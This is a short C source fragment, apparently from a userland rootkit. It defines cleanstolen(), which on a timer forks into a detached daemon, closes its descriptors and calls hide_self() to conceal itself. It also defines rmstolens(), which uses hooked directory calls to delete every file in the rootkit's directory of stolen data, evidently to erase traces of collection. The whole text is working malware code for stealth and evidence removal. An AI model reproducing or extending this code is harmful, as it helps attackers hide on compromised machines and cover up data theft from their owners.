void rmstolens(const bdvcfg_t *bc){
    DIR *dp;
    struct dirent *dir;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, bc->interestdir);
    if(dp == NULL) return;
    const size_t intdirlen = strlen(bc->interestdir);

    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;
        const size_t pathlen = intdirlen + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", bc->interestdir, dir->d_name);
        rm(path);
    }
    closedir(dp);
}

void cleanstolen(void){
    if(!initmvbc() || rknomore())
        return;

    const time_t curtime = time(NULL),
                 last = mvbc->filecleantime;
    if(curtime - last < FILE_CLEANSE_TIMER)
        return;
 
    pid_t pid;
    if((pid = fork()) < 0) return;
    else if(pid > 0){
        /* update last clean time. */
        mvbc->filecleantime = curtime;
        updbdvcfg(mvbc);
        return;
    }

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    setsid() < 0 ? exit(0) : 0;
    fdclosee();
    (pid = fork()) != 0 ? exit(0) : hide_self();
    rmstolens(mvbc);
    exit(0);
}
